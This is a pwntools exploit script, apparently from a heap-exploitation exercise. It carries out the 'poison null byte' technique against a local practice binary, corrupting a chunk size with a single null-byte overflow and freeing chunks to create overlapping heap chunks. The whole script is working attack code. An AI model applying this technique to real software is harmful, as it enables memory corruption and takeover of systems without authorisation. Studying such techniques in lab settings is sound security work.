#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("poison_null_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ", timeout=1)

# Select the "read" option; read size bytes.
def read(index, size):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(size)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================
#
# =-=-=- CREATE OVERLAPPING CHUNKS =-=-=-
#
# Request 4 chunks.
overflow = malloc(0x88) # Overflow from this chunk to succeeding chunk's size field
victim = malloc(0x208) # Victim of single null-byte overflow
consolidate = malloc(0x88) # Free this chunk to consolidate over the "victim" chunk
guard = malloc(0x18) # Guard against consolidation with top chunk.

# Free the victim chunk into the unsortedbin.
free(victim)

# Overflow the victim's prev_size bit to scrub 16 bytes from it's size later on
edit(overflow, b"Y"*0x88)

# Request two 0x100 sized chunks in order to remainder "victim" chunk
# Succeeding chunk's size field is not updated because victim chunk appears
# to be 0x10 bytes smaller.
victim_1 = malloc(0xf8)
victim_2 = malloc(0xf8)

# Free victim_1 into unsortedbin.
free(victim_1)

# Free the "consolidate" chunk succeeding victim_2 in order to consolidate
# it backwards with victim_1 over victim_2
free(consolidate)

# =============================================================================

io.interactive()
